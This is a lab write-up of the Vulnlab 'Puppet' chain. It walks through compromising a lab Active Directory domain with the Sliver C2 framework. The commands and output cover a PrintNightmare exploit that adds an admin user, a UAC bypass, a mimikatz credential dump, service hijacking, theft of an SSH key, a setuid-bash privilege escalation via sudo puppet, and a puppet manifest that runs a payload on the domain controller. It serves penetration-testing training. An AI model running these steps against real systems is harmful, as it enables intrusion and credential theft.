---
categories:
- Vulnlab
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2024-10-27-vl-puppet
tags:
- active directory
- c2
- windows
- sliver
title: VL Puppet
---

Puppet is a medium-difficulty chain on Vulnlab in which you are using the sliver c2 framework to compromise a small ad environment. You start with an already existing beacon on file server, escalate privileges via print nightmare and then dump credentials. Afterwards you laterally move to a linux system that is acting as a puppet server, essentially controlling the whole environment. You escalate privileges on the puppet server and use it to move laterally to the domain controller where you dump credentials once more to obtain the final flag.

## Enumeration

We start with a port scan on the only machine that's available (think of the company giving you an internal machine for the test):

```terminal
Host is up (0.024s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
8443/tcp  open  https-alt
31337/tcp open  Elite
``` 

Besides ftp and ssh we notice 8443 and 31337 which are rather uncommon ports. Let's check ftp first:

```terminal
ftp 10.10.144.231
Connected to 10.10.144.231.
220 (vsFTPd 3.0.5)
Name (10.10.144.231:xct): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||38834|)
150 Here comes the directory listing.
-rw----r--    1 0        0            2119 Oct 11 12:32 red_127.0.0.1.cfg
-rwxr-xr-x    1 0        0        36515304 Oct 12 18:17 sliver-client_linux
226 Directory send OK.
ftp>
```

The ftp share contains a sliver config and also the sliver client for convenience. This company already setup the c2 server for you but doesn't want to give you shell access on the server. Let's try to connect. When we check the config we note that it's connecting to localhost by default:

```terminal
...
"lhost":"127.0.0.1",
"lport":31337,
...
``` 

An easy fix is running socat to redirect traffic from local port 31337 to the remote machine:

```terminal
sudo socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.10.144.231:31337
```

Now we can import the config and start the sliver client:

``` terminal
./sliver-client_linux import $PWD/red_127.0.0.1.cfg

Connecting to 127.0.0.1:31337 ...
[*] Loaded 20 aliases from disk
[*] Loaded 105 extension(s) from disk

 	  ██████  ██▓     ██▓ ██▒   █▓▓█████  ██▀███
	▒██    ▒ ▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██ ▒ ██▒
	░ ▓██▄   ▒██░    ▒██▒ ▓██  █▒░▒███   ▓██ ░▄█ ▒
	  ▒   ██▒▒██░    ░██░  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄
	▒██████▒▒░██████▒░██░   ▒▀█░  ░▒████▒░██▓ ▒██▒
	▒ ▒▓▒ ▒ ░░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░
	░ ░▒  ░ ░░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░  ░▒ ░ ▒░
	░  ░  ░    ░ ░    ▒ ░     ░░     ░     ░░   ░
		  ░      ░  ░ ░        ░     ░  ░   ░

All hackers gain conspire
[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver >
``` 

Running the `beacons` command shows that a beacon is already connected to this server:

```terminal
sliver > beacons

 ID         Name          Transport   Hostname   Username             Operating System   Last Check-In   Next Check-In
========== ============= =========== ========== ==================== ================== =============== ===============
 56d068c7   puppet-mtls   mtls        File01     PUPPET\Bruce.Smith   windows/amd64      6s              26s
```

We can now either interact with the beacon or switch to a faster interactive session. For this lab I'm going to work with a session but note that on real engagements working with a beacon is usually preferred for evasion purposes. Beacons sleep between command executions and most c2 frameworks apply obfuscation while those sleeps are occurring. When switching to interactive session, no sleeps occur anymore so this evasion component is lost. Let's switch to the session then:

```terminal

[*] Active beacon puppet-mtls (56d068c7-b273-4b0e-aabf-327b0a632eb0)

sliver (puppet-mtls) > interactive

[*] Using beacon's active C2 endpoint: mtls://pm01.puppet.vl:8443
[*] Tasked beacon puppet-mtls (71bf6b46)
[*] Session 6e7673eb puppet-mtls - 10.10.144.230:50522 (File01) - windows/amd64 - Thu, 17 Oct 2024 13:21:43 CEST

sliver (puppet-mtls) > use 6e7673eb

[*] Active session puppet-mtls (6e7673eb-db33-4756-b7e9-8e9238c92aa4)

sliver (puppet-mtls) >
```

We are now going to do some local enumeration, first of all browsing the file system we note that puppet is installed:

```terminal
sliver (puppet-mtls) > cd c:\\programdata

[*] C:\programdata

sliver (puppet-mtls) > ls

C:\programdata (17 items, 4.6 KiB)
==================================
...
drwxrwxrwx  Puppet                                                     <dir>    Sat Oct 12 04:42:37 -0700 2024
drwxrwxrwx  PuppetLabs                                                 <dir>    Fri Oct 11 06:07:15 -0700 2024
...
```

[Puppet](https://www.puppet.com/) is a tool for configuration management - in a way similar to our c2 framework :) This means there is somewhere a puppet server which is controlling machines of the environment. Next we want to know which context we are running in - to see this we are going to run the `sa-whoami` beacon object file (bof):

```terminal
sliver (puppet-mtls) > sa-whoami

[*] Successfully executed sa-whoami (coff-loader)
[*] Got output:

UserName		SID
====================== ====================================
PUPPET\Bruce.Smith	S-1-5-21-3066630505-2324057459-3046381011-1126


GROUP INFORMATION                                 Type                     SID                                          Attributes
================================================= ===================== ============================================= ==================================================
PUPPET\Domain Users                               Group                    S-1-5-21-3066630505-2324057459-3046381011-513 Mandatory group, Enabled by default, Enabled group,
Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group,
BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group,
CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group,
LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group,
PUPPET\employees                                  Group                    S-1-5-21-3066630505-2324057459-3046381011-1105 Mandatory group, Enabled by default, Enabled group,
Authentication authority asserted identity        Well-known group         S-1-18-1                                      Mandatory group, Enabled by default, Enabled group,
Mandatory Label\Medium Mandatory Level            Label                    S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group,


Privilege Name                Description                                       State
============================= ================================================= ===========================
SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled 
```

Note that we are a domain user of the "employees" group but don't seem to have any special privileges. Our next step is gathering data about the ad environment via Bloodhound. We can directly run the sharp-hound-4 assembly from the sliver armory to achieve this:

```terminal
sliver (puppet-mtls) > cd c:\\temp
sliver (puppet-mtls) > sharp-hound-4 -s -t 300 -- -c all,gpolocalgroup

[*] sharp-hound-4 output:
2024-10-17T04:33:04.4654394-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-10-17T04:33:04.8250883-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-10-17T04:33:04.8882233-07:00|INFORMATION|Initializing SharpHound at 4:33 AM on 10/17/2024
2024-10-17T04:33:05.2644779-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for puppet.vl : DC01.puppet.vl
2024-10-17T04:33:05.3589164-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-10-17T04:33:05.7343716-07:00|INFORMATION|Beginning LDAP search for puppet.vl
2024-10-17T04:33:05.8288053-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-10-17T04:33:05.8288053-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-10-17T04:33:36.0752344-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 39 MB RAM
2024-10-17T04:34:02.4117649-07:00|INFORMATION|Consumers finished, closing output channel
2024-10-17T04:34:03.0560925-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2024-10-17T04:34:04.1011067-07:00|INFORMATION|Status: 126 objects finished (+126 2.172414)/s -- Using 49 MB RAM
2024-10-17T04:34:04.1323414-07:00|INFORMATION|Enumeration finished in 00:00:58.3942019
2024-10-17T04:34:04.2889989-07:00|INFORMATION|Saving cache with stats: 85 ID to type mappings.
 87 name to SID mappings.
 1 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-10-17T04:34:04.3046319-07:00|INFORMATION|SharpHound Enumeration Completed at 4:34 AM on 10/17/2024! Happy Graphing!
```

Note that this saves the output as a zip on the target machine, we still have to download it:

```terminal
sliver (puppet-mtls) > download 20241017043355_BloodHound.zip

[*] Wrote 13759 bytes (1 file successfully, 0 files unsuccessfully) to /home/xct/vl/puppet/20241017043355_BloodHound.zip
```

Afterwards we immediately remove the files on the target machine. We load the files into our local BloodHound instance but can't see any particularly interesting paths. As a next step, we run the `sa-adcs-enum` bof to enumerate any potential ADCS instances:

```terminal
sa-adcs-enum

[*] Successfully executed sa-adcs-enum (coff-loader)
[*] Got output:

[*] Found 0 CAs in the domain

adcs_enum SUCCESS.
```

There are however none. Additionally we enumerate open ports the local machine via another bof:

```terminal
sliver (puppet-mtls) > sa-netstat

[*] Successfully executed sa-netstat (coff-loader)
[*] Got output:
Processing: 14 Entries
  PROTO SRC                    DST                          STATE                                                                     PROCESS   PID
  TCP  0.0.0.0:135            LISTEN                   LISTENING                                                                             (  856)
  TCP  0.0.0.0:445            LISTEN                   LISTENING                                                                             (    4)
  TCP  0.0.0.0:3389           LISTEN                   LISTENING                                                                             ( 1020)
  TCP  0.0.0.0:5985           LISTEN                   LISTENING                                                                             (    4)
  TCP  0.0.0.0:47001          LISTEN                   LISTENING                                                                             (    4)
  TCP  0.0.0.0:49664          LISTEN                   LISTENING                                                                             (  676)
  TCP  0.0.0.0:49665          LISTEN                   LISTENING                                                                             (  532)
  TCP  0.0.0.0:49666          LISTEN                   LISTENING                                                                             (  732)
  TCP  0.0.0.0:49667          LISTEN                   LISTENING                                                                             (  676)
  TCP  0.0.0.0:49668          LISTEN                   LISTENING                                                                             ( 1844)
  TCP  0.0.0.0:49669          LISTEN                   LISTENING                                                                             ( 1012)
  TCP  0.0.0.0:49673          LISTEN                   LISTENING                                                                             (  656)
  TCP  10.10.144.230:139      LISTEN                   LISTENING                                                                             (    4)
  TCP  10.10.144.230:50522    10.10.144.231:8443     ESTABLISHED                                     C:\ProgramData\Puppet\puppet-update.exe ( 4068)
  UDP  0.0.0.0:123            *:*                                                                                                            (  652)
  UDP  0.0.0.0:3389           *:*                                                                                                            ( 1020)
  UDP  0.0.0.0:5353           *:*                                                                                                            ( 1064)
  UDP  0.0.0.0:5355           *:*                                                                                                            ( 1064)
  UDP  10.10.144.230:137      *:*                                                                                                            (    4)
  UDP  10.10.144.230:138      *:*                                                                                                            (    4)
  UDP  127.0.0.1:52613        *:*                                                        C:\ProgramData\Puppet\puppet-update.exe             ( 4068)
  UDP  127.0.0.1:62913        *:*                                                                                                            (  676)
```

Nothing particular interesting sticks out. As a next step we look for local privilege escalation vulnerabilities. A good PowerShell script to use for this is [PrivescCheck](https://github.com/itm4n/PrivescCheck) by itm4n. Since we can not reach our attacker machine directly from the target machine, we will have to either upload the script to the target or host in on the c2 machine. In this case I'm going with the upload way:


```terminal
sliver (puppet-mtls) > upload PrivescCheck.ps1
sliver (puppet-mtls) > sharpsh -t 300 -- -c invoke-privesccheck -u c:\\temp\\PrivescCheck.ps1

...
[*] Status: Vulnerable - High


Policy      : Limits print driver installation to Administrators
Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
Value       : RestrictDriverInstallationToAdministrators
Data        : 0
Default     : 1
Expected    : <null|1>
Description : Installing printer drivers does not require administrator privileges.

Policy      : Point and Print Restrictions > NoWarningNoElevationOnInstall
Key         : HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint
Value       : NoWarningNoElevationOnInstall
Data        : 1
Default     : 0
Expected    : <null|0>
Description : Do not show warning or elevation prompt. Note: this setting reintroduces the PrintNightmare LPE
              vulnerability, even if the settings 'InForest' and/or 'TrustedServers' are configured.
...
```

The machine is vulnerable to [PrintNightmare](https://itm4n.github.io/printnightmare-exploitation/) due to a misconfiguration! There are many ways to exploit this, for simplicity I'm going to go with a PoC from this [repo](https://github.com/JohnHammond/CVE-2021-34527). PrintNightmare essentially loads a attacker-controlled DLL as SYSTEM so you could also create your own DLL to load a sliver beacon directly.

However the PoC by John Hammond allows to use a precompiled DLL to add a new administrator user. While this is easy to detect it's a quick way to achieve what we want here. We use `sharpsh` once more to run the PoC and add a new local admin:

[Encoded Command](https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')&input=SW52b2tlLU5pZ2h0bWFyZSAtRHJpdmVyTmFtZSAiWGVyb3gzMDEwIiAtTmV3VXNlciAicmVkcHVwcGV0IiAtTmV3UGFzc3dvcmQgIlJlZFB1cHBldDEyMyI)

```terminal
sliver (puppet-mtls) > upload CVE-2021-34527.ps1

sliver (puppet-mtls) > sharpsh -i -s -t 300 -- -u c:\\temp\\CVE-2021-34527.ps1 -e -c SQBuAHYAbwBrAGUALQBOAGkAZwBoAHQAbQBhAHIAZQAgAC0ARAByAGkAdgBlAHIATgBhAG0AZQAgACIAWABlAHIAbwB4ADMAMAAxADAAIgAgAC0ATgBlAHcAVQBzAGUAcgAgACIAcgBlAGQAcAB1AHAAcABlAHQAIgAgAC0ATgBlAHcAUABhAHMAcwB3AG8AcgBkACAAIgBSAGUAZABQAHUAcABwAGUAdAAxADIAMwAiAA==
```

Since we added a local user that is in the administrators group, we can now proceed to use `runas` to switch into its context by running the initial beacon payload once more:

```terminal
sliver (puppet-mtls) > runas -u redpuppet -P "RedPuppet123" -p c:\\programdata\\puppet\\puppet-update.exe

[*] Successfully ran c:\programdata\puppet\puppet-update.exe  on puppet-mtls

[*] Beacon 913973f8 puppet-mtls - 10.10.144.230:51476 (File01) - windows/amd64 - Thu, 17 Oct 2024 14:44:15 CEST
```

This new beacon is however not in an elevated context due to UAC:

```terminal
sliver (puppet-mtls) > sa-whoami

[*] Tasked beacon puppet-mtls (cf6b98ac)

[+] puppet-mtls completed task cf6b98ac

[*] Successfully executed sa-whoami (coff-loader)
[*] Got output:

UserName		SID
====================== ====================================
FILE01\redpuppet	S-1-5-21-2946821189-2073930159-359736154-1001


GROUP INFORMATION                                 Type                     SID                                          Attributes
================================================= ===================== ============================================= ==================================================
FILE01\None                                       Group                    S-1-5-21-2946821189-2073930159-359736154-513  Mandatory group, Enabled by default, Enabled group,
Everyone                                          Well-known group         S-1-1-0                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Local account and member of Administrators groupWell-known group         S-1-5-114
BUILTIN\Administrators                            Alias                    S-1-5-32-544
BUILTIN\Users                                     Alias                    S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\INTERACTIVE                          Well-known group         S-1-5-4                                       Mandatory group, Enabled by default, Enabled group,
CONSOLE LOGON                                     Well-known group         S-1-2-1                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Authenticated Users                  Well-known group         S-1-5-11                                      Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\This Organization                    Well-known group         S-1-5-15                                      Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\Local account                        Well-known group         S-1-5-113                                     Mandatory group, Enabled by default, Enabled group,
LOCAL                                             Well-known group         S-1-2-0                                       Mandatory group, Enabled by default, Enabled group,
NT AUTHORITY\NTLM Authentication                  Well-known group         S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group,
Mandatory Label\Medium Mandatory Level            Label                    S-1-16-8192                                   Mandatory group, Enabled by default, Enabled group,


Privilege Name                Description                                       State
============================= ================================================= ===========================
SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled
```

Now we continue with an [UAC bypass](https://github.com/icyguider/UAC-BOF-Bonanza) to finally get a system beacon:

Compiling the UAC bypass BOF:

```terminal
cp -rp ~/dev/UACBypasses/SspiUacBypass /root/.sliver-client/extensions/
cd /root/.sliver-client/extensions/SspiUacBypass/; make
```

Running the BOF:

```terminal
extensions load /home/xct/.sliver-client/extensions/SspiUacBypass
SspiUacBypass C:\\programdata\\puppet\\puppet-update.exe

Forging a token from a fake Network Authentication through Datagram Contexts
Network Authentication token forged correctly, handle --> 0x2a4
Forged Token Session ID set to 1. lsasrv!LsapApplyLoopbackSessionId adjusted the token to our current session
Bypass Success! Now impersonating the forged token... Loopback network auth should be seen as elevated now
Invoking CreateSvcRpc (by @x86matthew)
Connecting to \\127.0.0.1\pipe\ntsvcs RPC pipe
Opening service manager...
Creating temporary service...
Executing 'C:\programdata\puppet\puppet-update.exe' as SYSTEM user...
Deleting temporary service...
Finished


[*] Beacon 15d1aae2 puppet-mtls - 10.10.144.230:51531 (File01) - windows/amd64 - Thu, 17 Oct 2024 14:48:30 CEST
```

This shows a new beacon as SYSTEM:

```terminal
sliver (puppet-mtls) > beacons

 ID         Name          Transport   Hostname   Username              Operating System   Last Check-In   Next Check-In
========== ============= =========== ========== ===================== ================== =============== ===============
 56d068c7   puppet-mtls   mtls        File01     PUPPET\Bruce.Smith    windows/amd64      15s             17s
 913973f8   puppet-mtls   mtls        File01     <err>                 windows/amd64      2s              30s
 15d1aae2   puppet-mtls   mtls        File01     NT AUTHORITY\SYSTEM   windows/amd64      2s              29s
```

From the new beacon we can now run mimikatz to dump credentials via the sideload functionality (sideload is essentially implementing a custom peloader to run pe files from memory):

```terminal
use 15d1aae2
sideload /home/xct/drop/mimikatz.exe "token::elevate privilege::debug sekurlsa::logonpasswords exit"

...
msv :	
	 [00000003] Primary
	 * Username : svc_puppet_win_t1
	 * Domain   : PUPPET
	 * NTLM     : 784c***
	 * SHA1     : e4b6***
	 * DPAPI    : abe7***
...
```

Besides the hashes of bruce and the machine itself, we also get the hash of a new user: `svc_puppet_win_t1`. This account is likely the account that puppet uses to execute commands on tier one windows servers. According to the AD data we gathered there is also a `svc_puppet_win_t0` and a  `svc_puppet_lin_t1` account.

One aspect we did not enumerate yet, is domain shares. So let's first do it from the system account (which is just a normal domain user as well - the machine account of the server):

```terminal
sa-netshares dc01

Share:
---------------------file01----------------------------------
ADMIN$
C$
files
IPC$

sa-netshares dc01

Share:
---------------------dc01----------------------------------
ADMIN$
C$
IPC$
it
NETLOGON
SYSVOL
```

Non-default shares are "files" on file01 where we already administrator and the it share on the dc. Let's check if we can access the it share:

```terminal
sliver (puppet-mtls) > ls \\\\dc01.puppet.vl\\it

\\dc01.puppet.vl\it\ (0 items, 0 B)
==================================
```

We don't have access there. Let's check the new user we got earlier. This is the user running the puppet service, so without having to use pass-the-hash we could change the service config to obtain a beacon, and then change it back afterwards. Let's first enumerate services:

```terminal
sliver (puppet-mtls) > sa-sc-enum
...
sliver (puppet-mtls) > sa-sc-query file01 puppet

[*] Successfully executed sa-sc-query (coff-loader)
[*] Got output:
SERVICE_NAME: puppet
	TYPE                 : 16 WIN32_OWN
	STATE                : 4 RUNNING
	WIN32_EXIT_CODE      : 0
	SERVICE_EXIT_CODE    : 0
	CHECKPOINT           : 0
	WAIT_HINT            : 0
	PID                  : 4040
	Flags                : 0
```

Now we could change the startup path and restart the service. There is a better way so I'm not going to do it, but here are the commands that would achieve it:

```terminal
# obtaining the service path
sa-reg-query file01 2 System\\CurrentControlSet\\Services\\puppet ImagePath

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\puppet
	ImagePath              REG_EXPAND_SZ   "C:\Program Files\Puppet Labs\Puppet\sys\ruby\bin\ruby.exe" -rubygems "C:\Program Files\Puppet Labs\Puppet\service\daemon.rb"

# changing the service path
execute -o -s -- c:\\windows\\system32\\cmd.exe /c sc config puppet binPath=c:\\programdata\\puppet\\puppet-update.exe
execute -o -s -- c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -c "Restart-Service -Name puppet"

...
[*] Beacon 55fa6e2a puppet-mtls - 10.10.144.230:52071 (File01) - windows/amd64 - Thu, 17 Oct 2024 15:23:40 CEST

# restoring the service path
execute -o -s -- c:\\windows\\system32\\cmd.exe /c sc config puppet binPath="\"C:\\Program Files\\Puppet Labs\\Puppet\\sys\\ruby\\bin\\ruby.exe\" -rubygems \"C:\\Program Files\\Puppet Labs\\Puppet\\service\\daemon.rb\""
execute -o -s -- c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -c "Restart-Service -Name puppet"
```

The problem with this is, although it works its a bit invasive and times out quickly due to being a service. A better approach is finding the existing process and injection/migrating to it:

```terminal
sliver (puppet-mtls) > ps

...
4832   656    PUPPET\svc_puppet_win_t1       x86_64   ruby.exe
...

sliver (puppet-mtls) >  migrate -p 4832

[*] Successfully migrated to 4832
```

From the new beacon as  `svc_puppet_win_t1` we can now list the share on the domain controller, since this account has access rights to it:

```terminal
sliver (puppet-mtls) > ls \\\\dc01.puppet.vl\\it

\\dc01.puppet.vl\it\ (3 items, 813.9 KiB)
=========================================
drwxrwxrwx  .ssh          <dir>      Sat Oct 12 01:39:50 -0700 2024
drwxrwxrwx  firewalls     <dir>      Sat Oct 12 01:15:05 -0700 2024
-rw-rw-rw-  PsExec64.exe  813.9 KiB  Sat Oct 12 01:07:00 -0700 2024
```

We can now see that we have indeed access and look around a bit.

```terminal
sliver (puppet-mtls) > ls \\\\dc01.puppet.vl\\it\\.ssh

\\dc01.puppet.vl\it\.ssh (2 items, 580 B)
=========================================
-rw-rw-rw-  ed25519      472 B  Sat Oct 12 01:14:23 -0700 2024
-rw-rw-rw-  ed25519.pub  108 B  Sat Oct 12 01:40:09 -0700 2024

sliver (puppet-mtls) > download \\\\dc01.puppet.vl\\it\\.ssh\\ed25519

[*] Tasked beacon puppet-mtls (9b246218)

sliver (puppet-mtls) > download \\\\dc01.puppet.vl\\it\\.ssh\\ed25519.pub

[*] Tasked beacon puppet-mtls (0a09f6ff)
```

From the content of the files, we learn that this is a ssh private key for the account `svc_puppet_lin_t1@puppet.vl` (note that you may have to convert line endings  since this key came from a windows machine). Although sliver has a functionality to run ssh commands from a beacon, I didn't have much luck getting it to work. So we are going to setup a port forward to ssh from our attacker machine:

```terminal
# forward port from a session or beacon
portfwd add --bind 2222 -r 10.10.144.231:22
...
ssh -i svc_puppet_lin_t1 -t 'svc_puppet_lin_t1@puppet.vl'@127.0.0.1 -p 2222
...
Last login: Sat Oct 12 18:18:52 2024 from 10.8.0.101
svc_puppet_lin_t1@puppet.vl@puppet:~$
```

This worked and we have access to the puppet master machine now:

```terminal
sudo -l
Matching Defaults entries for svc_puppet_lin_t1@puppet.vl on puppet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc_puppet_lin_t1@puppet.vl may run the following commands on puppet:
    (ALL) NOPASSWD: /usr/bin/puppet
```

Since this user is supposed to be here, he can also execute puppet as root. We can also use this for a quick privilege escalation:

```terminal
sudo puppet apply -e "exec { '/bin/sh -c \"chmod u+s /bin/bash\"': }"

bash -p
bash-5.1# id
uid=451001132(svc_puppet_lin_t1@puppet.vl) gid=451000513(domain users@puppet.vl) euid=0(root) groups=451000513(domain users@puppet.vl),451001133(admins_t1@puppet.vl)
```

Let's add a key to root and continue as the root user. Let's enumerate the machines controlled by this one via puppet:

```terminal
puppet cert list --all

+ "dc01.puppet.vl"   (SHA256) E4:C3:42:71:83:88:08:07:6A:C5:A1:9D:FA:C2:7E:BB:D5:65:5F:71:9F:D3:BE:11:96:B7:26:CD:4F:5C:68:C6
+ "file01.puppet.vl" (SHA256) 61:ED:86:C3:55:35:36:89:D5:FC:3A:32:05:D1:23:EC:C3:F1:58:E4:D7:9A:6B:3E:65:F4:F2:F2:77:34:B0:CA
+ "puppet.puppet.vl" (SHA256) 11:65:85:DB:9F:E4:19:03:04:21:92:4B:19:03:17:6D:29:A9:E9:56:0F:04:A6:16:2B:44:46:A3:33:20:92:9C (alt names: "DNS:puppet", "DNS:puppet.puppet.vl")
```

We can see that both file01 and the dc are controlled by this puppet master instance. Although we don't know which accounts the agents run as (besides for file01) we can guess that it's probably `svc_puppet_win_t0` for the domain controller. Let's find a way to run a command there:

```terminal
mkdir -p /etc/puppet/code/environments/production/manifests
nano /etc/puppet/code/environments/production/manifests/site.pp


node 'dc01.puppet.vl' {
  exec { 'pwned':
    command   => 'C:\\Windows\\System32\\cmd.exe /c \\\\file01.puppet.vl\\files\\update.exe',
    logoutput => true,
  }
}
node default {
  notify { 'This is the default node': }
}
```

Note that we are trying to run a payload of a smb share on the file server we are on. We also have to copy the payload there. Finally we can try to run the payload:

```terminal
puppet apply /etc/puppet/code/environments/production/manifests/site.pp 
```

It's up the agent to pickup the change. On default settings this is every 30 minutes, but here the agent is checking in every minute to help with the exploitation.

Shortly after we get a beacon from the dc:

```terminal
[*] Beacon 66b57ae6 puppet-mtls - 10.10.144.229:63253 (DC01) - windows/amd64 - Thu, 17 Oct 2024 16:07:46 CEST

sliver (puppet-mtls) > use 66b57ae6
sliver (puppet-mtls) > sa-whoami

UserName		SID
====================== ====================================
PUPPET\svc_puppet_win_t0	S-1-5-21-3066630505-2324057459-3046381011-1602
```

This gives full admin privileges on the DC, the final flag is however not in the usual location - on this machine it's the password of one of the users. So we have to dump credentials to obtain it.

That's it for this chain, I hope it was fun!

